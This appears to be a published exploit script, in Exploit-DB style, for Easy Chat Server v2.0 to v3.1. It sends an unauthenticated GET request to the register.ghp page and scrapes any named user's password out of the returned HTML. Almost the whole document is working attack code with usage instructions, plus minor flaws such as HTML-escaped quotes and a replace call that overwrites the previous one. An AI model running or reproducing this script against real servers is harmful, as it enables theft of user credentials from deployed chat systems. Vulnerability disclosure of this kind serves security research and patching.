# Date: 09/10/2017
# Software Link: http://echatserver.com/ecssetup.exe
# Exploit Author: Aitezaz Mohsin
# Vulnerable Version: v2.0 to v3.1
# Vulnerability Type: Pre-Auth Remote Password Disclosure
# Severity: Critical
 
# =========================================================================================================
#   Registeration page &#039;register.ghp&#039; allows disclosing ANY user&#039;s password.
# Remote un-authenticated attackers can send HTTP GET requests to obtain ANY Easy Chat Server user password.
# =========================================================================================================
 
# USAGE: python exploit.py ip username
 
#!/usr/bin/python
 
import urllib
import re
import requests
import sys
 
ip = sys.argv[1]
username = sys.argv[2]
 
url = &#039;http://&#039; + ip + &#039;/register.ghp?username=&#039; + username + &#039;&password=&#039;
response = requests.get(url)
html = response.content
 
pattern = &#039;<INPUT type="password" name="Password" maxlength="30"  value="(.+?)">&#039;
result = re.compile(pattern)
 
password = re.findall(result,html)
 
x = &#039;&#039;.join(password)
 
password = x.replace("[", "")
password = x.replace("]", "")
 
print "Password: " + password

